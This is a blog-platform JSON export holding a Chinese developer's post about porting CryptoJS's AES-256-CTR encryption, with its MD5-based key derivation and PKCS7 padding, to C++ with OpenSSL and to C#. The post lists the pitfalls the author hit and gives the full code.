&lt;openssl/md5.h&gt;\n#include &lt;openssl/aes.h&gt;\n#include &lt;cstring&gt;\nvoid calculate_sha256(\n    const std::string&amp; input, \n    unsigned char* output\n) &#123;\n    EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n    if (mdctx == nullptr) &#123;\n        std::cerr &lt;&lt; &quot;Error creating EVP_MD_CTX.&quot; &lt;&lt; std::endl;\n        return;\n    &#125;\n\n \n    if (1 != EVP_DigestInit_ex(mdctx, EVP_sha256(), nullptr)) &#123;\n        std::cerr &lt;&lt; &quot;Error initializing digest.&quot; &lt;&lt; std::endl;\n        EVP_MD_CTX_free(mdctx);\n        return;\n    &#125;\n\n\n    if (1 != EVP_DigestUpdate(mdctx, input.c_str(), input.length())) &#123;\n        std::cerr &lt;&lt; &quot;Error updating digest.&quot; &lt;&lt; std::endl;\n        EVP_MD_CTX_free(mdctx);\n        return;\n    &#125;\n\n    \n    unsigned int len = 0;\n    if (1 != EVP_DigestFinal_ex(mdctx, output, &amp;len)) &#123;\n        std::cerr &lt;&lt; &quot;Error finalizing digest.&quot; &lt;&lt; std::endl;\n        EVP_MD_CTX_free(mdctx);\n        return;\n    &#125;\n\n    EVP_MD_CTX_free(mdctx);\n&#125;\n\n\n\nstd::string base64_encode(\n    const unsigned char* input, size_t length\n) &#123;\n    BIO* bio;\n    BIO* b64;\n    BUF_MEM* bufferPtr;\n\n    b64 = BIO_new(BIO_f_base64());\n    bio = BIO_new(BIO_s_mem());\n    BIO_push(b64, bio);\n    BIO_write(b64, input, length);\n    BIO_flush(b64);\n    BIO_get_mem_ptr(b64, &amp;bufferPtr);\n\n    std::string result(bufferPtr-&gt;data, bufferPtr-&gt;length);\n\n    BIO_free_all(b64);\n\n    return result;\n&#125;\n\n\nstd::string generate_key_from_secret(\n    const std::string&amp; secretKey\n) &#123;\n    std::string salt = &quot;one-deep&quot;; \n    std::string combined = secretKey + salt;  \n\n\n    unsigned char hash[SHA256_DIGEST_LENGTH];\n    calculate_sha256(combined, hash);\n\n\n    std::string base64Hash = base64_encode(hash, SHA256_DIGEST_LENGTH);\n\n    return base64Hash.substr(0, 32);\n&#125;\nstd::vector&lt;unsigned char&gt; EVP_BytesToKey_MD5_EVP(\n    const std::string&amp; password,\n    const std::vector&lt;unsigned char&gt;&amp; salt,\n    int key_iv_len\n) &#123;\n    std::vector&lt;unsigned char&gt; result;\n    std::vector&lt;unsigned char&gt; prev;\n\n    while ((int)result.size() &lt; key_iv_len) &#123;\n        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n        EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);\n\n        if (!prev.empty())\n            EVP_DigestUpdate(mdctx, prev.data(), prev.size());\n\n        EVP_DigestUpdate(mdctx, password.data(), password.size());\n        EVP_DigestUpdate(mdctx, salt.data(), salt.size());\n\n        unsigned char md[EVP_MAX_MD_SIZE];\n        unsigned int md_len = 0;\n        EVP_DigestFinal_ex(mdctx, md, &amp;md_len);\n\n        EVP_MD_CTX_free(mdctx);\n\n        prev.assign(md, md + md_len);\n        result.insert(result.end(), md, md + md_len);\n    &#125;\n\n    result.resize(key_iv_len);\n    return result;\n&#125;\n\nstd::vector&lt;unsigned char&gt; base64Decode(\n    const std::string&amp; input\n) &#123;\n    BIO* bio, * b64;\n    int decodeLen = (input.length() * 3) / 4;\n    std::vector&lt;unsigned char&gt; buffer(decodeLen);\n\n    bio = BIO_new_mem_buf(input.data(), input.length());\n    b64 = BIO_new(BIO_f_base64());\n    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); \n    bio = BIO_push(b64, bio);\n\n    int length = BIO_read(bio, buffer.data(), input.length());\n    buffer.resize(length);\n\n    BIO_free_all(bio);\n    return buffer;\n&#125;\n\n\n\nstd::vector&lt;unsigned char&gt; aes256_ctr_decrypt(\n    const std::vector&lt;unsigned char&gt;&amp; ciphertext,\n    const std::vector&lt;unsigned char&gt;&amp; key,\n    const std::vector&lt;unsigned char&gt;&amp; iv\n) &#123;\n    std::vector&lt;unsigned char&gt; plaintext(ciphertext.size());\n\n    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n    EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n    int out_len1 = (int)plaintext.size();\n    EVP_DecryptUpdate(ctx, plaintext.data(), &amp;out_len1, ciphertext.data(), (int)ciphertext.size());\n\n    int out_len2;\n    EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len1, &amp;out_len2);\n    plaintext.resize(out_len1 + out_len2);\n\n    EVP_CIPHER_CTX_free(ctx);\n    return plaintext;\n&#125;\nstd::vector&lt;unsigned char&gt; remove_pkcs7_padding(const std::vector&lt;unsigned char&gt;&amp; data) &#123;\n    if (data.empty()) return data;\n    unsigned char pad_len = data.back();\n    if (pad_len == 0 || pad_len &gt; 16) return data;  \n    for (size_t i = data.size() - pad_len; i &lt; data.size(); i++) &#123;\n        if (data[i] != pad_len) return data;  \n    &#125;\n    return std::vector&lt;unsigned char&gt;(data.begin(), data.end() - pad_len);\n&#125;\nvoid 解密(\n    std::string&amp; secretKey,\n    std::string&amp; b64\n)\n&#123;\n    std::string password = generate_key_from_secret(secretKey);\n\n    std::cout &lt;&lt; &quot;Key: &quot; &lt;&lt; password &lt;&lt; std::endl;\n\n    auto decoded = base64Decode(b64);\n\n\n    if (decoded.size() &lt; 16 || std::string(decoded.begin(), decoded.begin() + 8) != &quot;Salted__&quot;) &#123;\n        std::cerr &lt;&lt; &quot;Not a salted OpenSSL format.&quot; &lt;&lt; std::endl;\n    &#125;\n\n    std::vector&lt;unsigned char&gt; salt(decoded.begin() + 8, decoded.begin() + 16);\n    std::vector&lt;unsigned char&gt; ciphertext(decoded.begin() + 16, decoded.end());\n\n    std::cout &lt;&lt; &quot;Salt: &quot;;\n    for (auto c : salt) printf(&quot;%02X&quot;, c);\n    std::cout &lt;&lt; std::endl;\n\n  \n    int key_len = 32;\n    int iv_len = 16;\n    auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len); \n\n\n\n    std::vector&lt;unsigned char&gt; key(key_iv.begin(), key_iv.begin() + key_len);\n    std::vector&lt;unsigned char&gt; iv(key_iv.begin() + key_len, key_iv.end());\n\n    std::cout &lt;&lt; &quot;Key: &quot;;\n    for (auto c : key) printf(&quot;%02X&quot;, c);\n    std::cout &lt;&lt; &quot;\\nIV: &quot;;\n    for (auto c : iv) printf(&quot;%02X&quot;, c);\n    std::cout &lt;&lt; std::endl;\n\n    auto plaintext_with_padding = aes256_ctr_decrypt(ciphertext, key, iv);\n    auto plaintext = remove_pkcs7_padding(plaintext_with_padding);\n    std::cout &lt;&lt; &quot;Decrypted: &quot;;\n    for (auto c : plaintext) std::cout &lt;&lt; c;\n    std::cout &lt;&lt; std::endl;\n&#125;\n\nstd::vector&lt;unsigned char&gt; aes256_ctr_encrypt(\n    const std::vector&lt;unsigned char&gt;&amp; plaintext,\n    const std::vector&lt;unsigned char&gt;&amp; key,\n    const std::vector&lt;unsigned char&gt;&amp; iv\n) &#123;\n    std::vector&lt;unsigned char&gt; ciphertext(plaintext.size());\n\n    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n    EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n    int out_len1 = (int)ciphertext.size();\n    EVP_EncryptUpdate(ctx, ciphertext.data(), &amp;out_len1, plaintext.data(), (int)plaintext.size());\n\n    int out_len2;\n    EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len1, &amp;out_len2);\n    ciphertext.resize(out_len1 + out_len2);\n\n    EVP_CIPHER_CTX_free(ctx);\n    return ciphertext;\n&#125;\n\nstd::string 加密(\n    const std::string&amp; plaintext_str,\n    const std::string&amp; secretKey\n) &#123;\n    std::string password = generate_key_from_secret(secretKey);\n\n\n    std::vector&lt;unsigned char&gt; salt(8);\n    if (!RAND_bytes(salt.data(), 8)) &#123;\n        std::cerr &lt;&lt; &quot;Failed to generate salt.&quot; &lt;&lt; std::endl;\n        return &quot;&quot;;\n    &#125;\n\n\n    int key_len = 32;\n    int iv_len = 16;\n    auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len);\n    std::vector&lt;unsigned char&gt; key(key_iv.begin(), key_iv.begin() + key_len);\n    std::vector&lt;unsigned char&gt; iv(key_iv.begin() + key_len, key_iv.end());\n\n    std::vector&lt;unsigned char&gt; plaintext(plaintext_str.begin(), plaintext_str.end());\n    size_t padding_len = 16 - (plaintext.size() % 16);\n    if (padding_len == 0) padding_len = 16;\n    plaintext.insert(plaintext.end(), padding_len, static_cast&lt;unsigned char&gt;(padding_len));\n    auto ciphertext = aes256_ctr_encrypt(plaintext, key, iv);\n\n   \n    std::vector&lt;unsigned char&gt; openssl_format;\n    openssl_format.insert(openssl_format.end(), &#123; &#39;S&#39;,&#39;a&#39;,&#39;l&#39;,&#39;t&#39;,&#39;e&#39;,&#39;d&#39;,&#39;_&#39;,&#39;_&#39; &#125;);\n    openssl_format.insert(openssl_format.end(), salt.begin(), salt.end());\n    openssl_format.insert(openssl_format.end(), ciphertext.begin(), ciphertext.end());\n\n    return base64_encode(openssl_format.data(), openssl_format.size());\n&#125;\n</code></pre>\n","excerpt":"","more":"<p>我原本 以為C++和C#還原cryptojs丟入GPT就能解出算法</p>\n<pre><code>function encrypt(message, secretKey) &#123;\n    var hash = CryptoJS.SHA256(secretKey + &#39;one-deep&#39;);\n    var key = hash.toString(CryptoJS.enc.Base64).substr(0, 32);\n\n    hash = CryptoJS.SHA256(secretKey.substr(0, 16));\n    var ive = hash.toString(CryptoJS.enc.Base64).substr(0, 16);\n\n    var options = &#123; iv: ive, mode: CryptoJS.mode.CTR &#125;;\n    var enc = CryptoJS.AES.encrypt(message, key, options);\n    return enc.toString();\n&#125;\n</code></pre>\n<p>後來  我只好去研究cryptojs底層實踐<br><span style=\"color:blue\">#第一坑</span><br>GPT的 回答的AES256_CTR_Encrypt 的加密<br>沒有 node_modules&#x2F;crypto-js&#x2F;evpkdf.js中的</p>\n<pre><code>cfg: Base.extend(&#123;\n    keySize: 128/32,\n    hasher: MD5,\n    iterations: 1\n&#125;),\n</code></pre>\n<p>此乃大坑之一也</p>\n<p><span style=\"color:blue\">#第二坑</span><br>GPT常用OpenSSL 3.0之前的舊版本的非EVP  舊函數 導致代碼執行不能<br>類似於AES_encrypt()<br>MD5_Init() &#x2F; SHA256_Init() &#x2F;HMAC()<br>我網路上查很多資料都沒有 我草大坑</p>\n<p><span style=\"color:blue\">#第三坑</span></p>\n<p>CRYPTOJS 雖然他沒有直說<br>但他  有用 PKCS7 填充<br>如果未滿足1 Chunk的 數據 會進行填充<br>尼瑪的 我原本只加解密大於1 Chunk 但當我加解密{} 空數據<br>直接故障報錯</p>\n<p><span style=\"color:green\">最後附上我的完整代碼</span></p>\n<p><span style=\"color:red;\">C#版本</span></p>\n<pre><code>public class OpenSSL_AES_CTR\n&#123;\n    public static string GenerateKeyFromSecret(string secretKey)\n    &#123;\n        string salt = &quot;one-deep&quot;;\n        string combined = secretKey + salt;\n\n        using (SHA256 sha256 = SHA256.Create())\n        &#123;\n            byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(combined));\n            string base64 = Convert.ToBase64String(hash);\n            return base64.Substring(0, 32);\n        &#125;\n    &#125;\n\n    public static byte[] EVP_BytesToKey_MD5(string password, byte[] salt, int keyIvLength)\n    &#123;\n        using (var md5 = MD5.Create())\n        &#123;\n            MemoryStream result = new MemoryStream();\n            byte[] prev = new byte[0];\n\n            while (result.Length &lt; keyIvLength)\n            &#123;\n                byte[] data = new byte[prev.Length + password.Length + salt.Length];\n                Buffer.BlockCopy(prev, 0, data, 0, prev.Length);\n                Buffer.BlockCopy(Encoding.UTF8.GetBytes(password), 0, data, prev.Length, password.Length);\n                Buffer.BlockCopy(salt, 0, data, prev.Length + password.Length, salt.Length);\n\n                prev = md5.ComputeHash(data);\n                result.Write(prev, 0, prev.Length);\n            &#125;\n\n            byte[] buffer = result.ToArray();\n            Array.Resize(ref buffer, keyIvLength);\n            return buffer;\n        &#125;\n    &#125;\n\n    public static byte[] AES256_CTR_Encrypt(byte[] plaintext, byte[] key, byte[] iv)\n    &#123;\n        using (Aes aes = Aes.Create())\n        &#123;\n            aes.Mode = CipherMode.ECB; \n            aes.Padding = PaddingMode.None;\n            aes.Key = key;\n\n            using (var encryptor = aes.CreateEncryptor())\n            &#123;\n                byte[] ciphertext = new byte[plaintext.Length];\n                byte[] counter = (byte[])iv.Clone();\n                byte[] keystreamBlock = new byte[16];\n                for (int i = 0; i &lt; plaintext.Length; i += 16)\n                &#123;\n                    keystreamBlock = encryptor.TransformFinalBlock(counter, 0, 16);\n\n                    for (int j = 0; j &lt; 16 &amp;&amp; (i + j) &lt; plaintext.Length; ++j)\n                        ciphertext[i + j] = (byte)(plaintext[i + j] ^ keystreamBlock[j]);\n\n                    \n                    for (int j = 15; j &gt;= 0; j--)\n                    &#123;\n                        if (++counter[j] != 0)\n                            break;\n                    &#125;\n                &#125;\n\n                return ciphertext;\n            &#125;\n        &#125;\n    &#125;\n\n    public static byte[] AES256_CTR_Decrypt(byte[] ciphertext, byte[] key, byte[] iv)\n    &#123;\n       \n        return AES256_CTR_Encrypt(ciphertext, key, iv);\n    &#125;\n    public static byte[] PKCS7Pad(byte[] data)\n    &#123;\n        int blockSize = 16;\n        int paddingLen = blockSize - (data.Length % blockSize);\n        if (paddingLen == 0) paddingLen = blockSize;\n\n        byte[] padded = new byte[data.Length + paddingLen];\n        Buffer.BlockCopy(data, 0, padded, 0, data.Length);\n        for (int i = data.Length; i &lt; padded.Length; i++)\n            padded[i] = (byte)paddingLen;\n\n        return padded;\n    &#125;\n\n    public static byte[] PKCS7Unpad(byte[] data)\n    &#123;\n        if (data.Length == 0) return data;\n        int paddingLen = data[data.Length - 1];\n        if (paddingLen &lt;= 0 || paddingLen &gt; 16) return data;\n\n        for (int i = data.Length - paddingLen; i &lt; data.Length; i++)\n        &#123;\n            if (data[i] != paddingLen)\n                return data;  \n        &#125;\n\n        byte[] unpadded = new byte[data.Length - paddingLen];\n        Buffer.BlockCopy(data, 0, unpadded, 0, unpadded.Length);\n        return unpadded;\n    &#125;\n\n    public static string Encrypt(string plaintext, string secretKey)\n    &#123;\n        string password = GenerateKeyFromSecret(secretKey);\n\n        byte[] salt = new byte[8];\n        RandomNumberGenerator.Fill(salt);\n\n        byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n        byte[] key = new byte[32];\n        byte[] iv = new byte[16];\n        Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n        Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n        byte[] pt = Encoding.UTF8.GetBytes(plaintext);\n        pt = PKCS7Pad(pt);\n        byte[] encrypted = AES256_CTR_Encrypt(pt, key, iv);\n\n\n\n        using (MemoryStream ms = new MemoryStream())\n        &#123;\n            byte[] prefix = Encoding.ASCII.GetBytes(&quot;Salted__&quot;);\n            ms.Write(prefix, 0, prefix.Length);\n            ms.Write(salt, 0, salt.Length);\n            ms.Write(encrypted, 0, encrypted.Length);\n\n            return Convert.ToBase64String(ms.ToArray());\n        &#125;\n    &#125;\n\n    public static string Decrypt(string b64, string secretKey)\n    &#123;\n        byte[] data = Convert.FromBase64String(b64);\n        if (data.Length &lt; 16 || Encoding.ASCII.GetString(data, 0, 8) != &quot;Salted__&quot;)\n            throw new Exception(&quot;Invalid format: not salted OpenSSL.&quot;);\n\n        byte[] salt = new byte[8];\n        Array.Copy(data, 8, salt, 0, 8);\n        byte[] ciphertext = new byte[data.Length - 16];\n        Array.Copy(data, 16, ciphertext, 0, ciphertext.Length);\n\n        string password = GenerateKeyFromSecret(secretKey);\n        byte[] keyIv = EVP_BytesToKey_MD5(password, salt, 32 + 16);\n        byte[] key = new byte[32];\n        byte[] iv = new byte[16];\n        Buffer.BlockCopy(keyIv, 0, key, 0, 32);\n        Buffer.BlockCopy(keyIv, 32, iv, 0, 16);\n\n        byte[] decrypted = AES256_CTR_Decrypt(ciphertext, key, iv);\n        decrypted = PKCS7Unpad(decrypted);\n        return Encoding.UTF8.GetString(decrypted);\n\n    &#125;\n&#125;\n</code></pre>\n<p> <span style=\"color:red;\">C++版本</span></p>\n<pre><code>#include &lt;openssl/rand.h&gt;\n#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n#include &lt;openssl/evp.h&gt;\n#include &lt;openssl/sha.h&gt;\n#include &lt;openssl/bio.h&gt;\n#include &lt;openssl/buffer.h&gt;\n#include &lt;iomanip&gt;\n#include &lt;openssl/md5.h&gt;\n#include &lt;openssl/aes.h&gt;\n#include &lt;cstring&gt;\nvoid calculate_sha256(\n    const std::string&amp; input, \n    unsigned char* output\n) &#123;\n    EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n    if (mdctx == nullptr) &#123;\n        std::cerr &lt;&lt; &quot;Error creating EVP_MD_CTX.&quot; &lt;&lt; std::endl;\n        return;\n    &#125;\n\n \n    if (1 != EVP_DigestInit_ex(mdctx, EVP_sha256(), nullptr)) &#123;\n        std::cerr &lt;&lt; &quot;Error initializing digest.&quot; &lt;&lt; std::endl;\n        EVP_MD_CTX_free(mdctx);\n        return;\n    &#125;\n\n\n    if (1 != EVP_DigestUpdate(mdctx, input.c_str(), input.length())) &#123;\n        std::cerr &lt;&lt; &quot;Error updating digest.&quot; &lt;&lt; std::endl;\n        EVP_MD_CTX_free(mdctx);\n        return;\n    &#125;\n\n    \n    unsigned int len = 0;\n    if (1 != EVP_DigestFinal_ex(mdctx, output, &amp;len)) &#123;\n        std::cerr &lt;&lt; &quot;Error finalizing digest.&quot; &lt;&lt; std::endl;\n        EVP_MD_CTX_free(mdctx);\n        return;\n    &#125;\n\n    EVP_MD_CTX_free(mdctx);\n&#125;\n\n\n\nstd::string base64_encode(\n    const unsigned char* input, size_t length\n) &#123;\n    BIO* bio;\n    BIO* b64;\n    BUF_MEM* bufferPtr;\n\n    b64 = BIO_new(BIO_f_base64());\n    bio = BIO_new(BIO_s_mem());\n    BIO_push(b64, bio);\n    BIO_write(b64, input, length);\n    BIO_flush(b64);\n    BIO_get_mem_ptr(b64, &amp;bufferPtr);\n\n    std::string result(bufferPtr-&gt;data, bufferPtr-&gt;length);\n\n    BIO_free_all(b64);\n\n    return result;\n&#125;\n\n\nstd::string generate_key_from_secret(\n    const std::string&amp; secretKey\n) &#123;\n    std::string salt = &quot;one-deep&quot;; \n    std::string combined = secretKey + salt;  \n\n\n    unsigned char hash[SHA256_DIGEST_LENGTH];\n    calculate_sha256(combined, hash);\n\n\n    std::string base64Hash = base64_encode(hash, SHA256_DIGEST_LENGTH);\n\n    return base64Hash.substr(0, 32);\n&#125;\nstd::vector&lt;unsigned char&gt; EVP_BytesToKey_MD5_EVP(\n    const std::string&amp; password,\n    const std::vector&lt;unsigned char&gt;&amp; salt,\n    int key_iv_len\n) &#123;\n    std::vector&lt;unsigned char&gt; result;\n    std::vector&lt;unsigned char&gt; prev;\n\n    while ((int)result.size() &lt; key_iv_len) &#123;\n        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();\n        EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);\n\n        if (!prev.empty())\n            EVP_DigestUpdate(mdctx, prev.data(), prev.size());\n\n        EVP_DigestUpdate(mdctx, password.data(), password.size());\n        EVP_DigestUpdate(mdctx, salt.data(), salt.size());\n\n        unsigned char md[EVP_MAX_MD_SIZE];\n        unsigned int md_len = 0;\n        EVP_DigestFinal_ex(mdctx, md, &amp;md_len);\n\n        EVP_MD_CTX_free(mdctx);\n\n        prev.assign(md, md + md_len);\n        result.insert(result.end(), md, md + md_len);\n    &#125;\n\n    result.resize(key_iv_len);\n    return result;\n&#125;\n\nstd::vector&lt;unsigned char&gt; base64Decode(\n    const std::string&amp; input\n) &#123;\n    BIO* bio, * b64;\n    int decodeLen = (input.length() * 3) / 4;\n    std::vector&lt;unsigned char&gt; buffer(decodeLen);\n\n    bio = BIO_new_mem_buf(input.data(), input.length());\n    b64 = BIO_new(BIO_f_base64());\n    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); \n    bio = BIO_push(b64, bio);\n\n    int length = BIO_read(bio, buffer.data(), input.length());\n    buffer.resize(length);\n\n    BIO_free_all(bio);\n    return buffer;\n&#125;\n\n\n\nstd::vector&lt;unsigned char&gt; aes256_ctr_decrypt(\n    const std::vector&lt;unsigned char&gt;&amp; ciphertext,\n    const std::vector&lt;unsigned char&gt;&amp; key,\n    const std::vector&lt;unsigned char&gt;&amp; iv\n) &#123;\n    std::vector&lt;unsigned char&gt; plaintext(ciphertext.size());\n\n    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n    EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n    int out_len1 = (int)plaintext.size();\n    EVP_DecryptUpdate(ctx, plaintext.data(), &amp;out_len1, ciphertext.data(), (int)ciphertext.size());\n\n    int out_len2;\n    EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len1, &amp;out_len2);\n    plaintext.resize(out_len1 + out_len2);\n\n    EVP_CIPHER_CTX_free(ctx);\n    return plaintext;\n&#125;\nstd::vector&lt;unsigned char&gt; remove_pkcs7_padding(const std::vector&lt;unsigned char&gt;&amp; data) &#123;\n    if (data.empty()) return data;\n    unsigned char pad_len = data.back();\n    if (pad_len == 0 || pad_len &gt; 16) return data;  \n    for (size_t i = data.size() - pad_len; i &lt; data.size(); i++) &#123;\n        if (data[i] != pad_len) return data;  \n    &#125;\n    return std::vector&lt;unsigned char&gt;(data.begin(), data.end() - pad_len);\n&#125;\nvoid 解密(\n    std::string&amp; secretKey,\n    std::string&amp; b64\n)\n&#123;\n    std::string password = generate_key_from_secret(secretKey);\n\n    std::cout &lt;&lt; &quot;Key: &quot; &lt;&lt; password &lt;&lt; std::endl;\n\n    auto decoded = base64Decode(b64);\n\n\n    if (decoded.size() &lt; 16 || std::string(decoded.begin(), decoded.begin() + 8) != &quot;Salted__&quot;) &#123;\n        std::cerr &lt;&lt; &quot;Not a salted OpenSSL format.&quot; &lt;&lt; std::endl;\n    &#125;\n\n    std::vector&lt;unsigned char&gt; salt(decoded.begin() + 8, decoded.begin() + 16);\n    std::vector&lt;unsigned char&gt; ciphertext(decoded.begin() + 16, decoded.end());\n\n    std::cout &lt;&lt; &quot;Salt: &quot;;\n    for (auto c : salt) printf(&quot;%02X&quot;, c);\n    std::cout &lt;&lt; std::endl;\n\n  \n    int key_len = 32;\n    int iv_len = 16;\n    auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len); \n\n\n\n    std::vector&lt;unsigned char&gt; key(key_iv.begin(), key_iv.begin() + key_len);\n    std::vector&lt;unsigned char&gt; iv(key_iv.begin() + key_len, key_iv.end());\n\n    std::cout &lt;&lt; &quot;Key: &quot;;\n    for (auto c : key) printf(&quot;%02X&quot;, c);\n    std::cout &lt;&lt; &quot;\\nIV: &quot;;\n    for (auto c : iv) printf(&quot;%02X&quot;, c);\n    std::cout &lt;&lt; std::endl;\n\n    auto plaintext_with_padding = aes256_ctr_decrypt(ciphertext, key, iv);\n    auto plaintext = remove_pkcs7_padding(plaintext_with_padding);\n    std::cout &lt;&lt; &quot;Decrypted: &quot;;\n    for (auto c : plaintext) std::cout &lt;&lt; c;\n    std::cout &lt;&lt; std::endl;\n&#125;\n\nstd::vector&lt;unsigned char&gt; aes256_ctr_encrypt(\n    const std::vector&lt;unsigned char&gt;&amp; plaintext,\n    const std::vector&lt;unsigned char&gt;&amp; key,\n    const std::vector&lt;unsigned char&gt;&amp; iv\n) &#123;\n    std::vector&lt;unsigned char&gt; ciphertext(plaintext.size());\n\n    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n    EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key.data(), iv.data());\n\n    int out_len1 = (int)ciphertext.size();\n    EVP_EncryptUpdate(ctx, ciphertext.data(), &amp;out_len1, plaintext.data(), (int)plaintext.size());\n\n    int out_len2;\n    EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len1, &amp;out_len2);\n    ciphertext.resize(out_len1 + out_len2);\n\n    EVP_CIPHER_CTX_free(ctx);\n    return ciphertext;\n&#125;\n\nstd::string 加密(\n    const std::string&amp; plaintext_str,\n    const std::string&amp; secretKey\n) &#123;\n    std::string password = generate_key_from_secret(secretKey);\n\n\n    std::vector&lt;unsigned char&gt; salt(8);\n    if (!RAND_bytes(salt.data(), 8)) &#123;\n        std::cerr &lt;&lt; &quot;Failed to generate salt.&quot; &lt;&lt; std::endl;\n        return &quot;&quot;;\n    &#125;\n\n\n    int key_len = 32;\n    int iv_len = 16;\n    auto key_iv = EVP_BytesToKey_MD5_EVP(password, salt, key_len + iv_len);\n    std::vector&lt;unsigned char&gt; key(key_iv.begin(), key_iv.begin() + key_len);\n    std::vector&lt;unsigned char&gt; iv(key_iv.begin() + key_len, key_iv.end());\n\n    std::vector&lt;unsigned char&gt; plaintext(plaintext_str.begin(), plaintext_str.end());\n    size_t padding_len = 16 - (plaintext.size() % 16);\n    if (padding_len == 0) padding_len = 16;\n    plaintext.insert(plaintext.end(), padding_len, static_cast&lt;unsigned char&gt;(padding_len));\n    auto ciphertext = aes256_ctr_encrypt(plaintext, key, iv);\n\n   \n    std::vector&lt;unsigned char&gt; openssl_format;\n    openssl_format.insert(openssl_format.end(), &#123; &#39;S&#39;,&#39;a&#39;,&#39;l&#39;,&#39;t&#39;,&#39;e&#39;,&#39;d&#39;,&#39;_&#39;,&#39;_&#39; &#125;);\n    openssl_format.insert(openssl_format.end(), salt.begin(), salt.end());\n    openssl_format.insert(openssl_format.end(), ciphertext.begin(), ciphertext.end());\n\n    return base64_encode(openssl_format.data(), openssl_format.size());\n&#125;\n</code></pre>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cmbhtkw9y0001zrlr6kqc9xyd","category_id":"cmbhtkwa10004zrlr0nn2es9v","_id":"cmbhtkwa6000bzrlrgxskguat"},{"post_id":"cmbhtkwa50009zrlrg2u78a91","category_id":"cmbhtkwa10004zrlr0nn2es9v","_id":"cmbhtkwa7000ezrlrd1dnh7ia"},{"post_id":"cmbhtkwa20005zrlra3ymczyv","category_id":"cmbhtkwa10004zrlr0nn2es9v","_id":"cmbhtkwa8000hzrlr3zw25gpy"},{"post_id":"cmbhtkwa6000czrlrbbikb6mm","category_id":"cmbhtkwa7000fzrlr07ybepqy","_id":"cmbhtkwaa000mzrlr642c3ow4"},{"post_id":"cmbhtkwa9000kzrlretd67din","category_id":"cmbhtkwa7000fzrlr07ybepqy","_id":"cmbhtkwaa000pzrlr1jxxcj30"},{"post_id":"cmbhtkwaa000ozrlrcg0f7ni1","category_id":"cmbhtkwa7000fzrlr07ybepqy","_id":"cmbhtkwab000tzrlravnjbmfq"},{"post_id":"cmbhtkwaa000qzrlr9bij3bto","category_id":"cmbhtkwa7000fzrlr07ybepqy","_id":"cmbhtkwac000wzrlr975x64u3"},{"post_id":"cmbhtkwab000szrlr3gvl8ld7","category_id":"cmbhtkwa7000fzrlr07ybepqy","_id":"cmbhtkwac000zzrlr30uxcctm"},{"post_id":"cmbhtkwab000rzrlr3yiid3hh","category_id":"cmbhtkwab000uzrlrc7q126fb","_id":"cmbhtkwad0012zrlr1ngvftwg"},{"post_id":"cmbhtkwad0011zrlrel994td3","category_id":"cmbhtkwa7000fzrlr07ybepqy","_id":"cmbhtkwae0016zrlr341f8fq9"},{"post_id":"cmbhtkwad0013zrlr3660cqy9","category_id":"cmbhtkwab000uzrlrc7q126fb","_id":"cmbhtkwaf0018zrlr5rks8dsb"}],"PostTag":[],"Tag":[]}}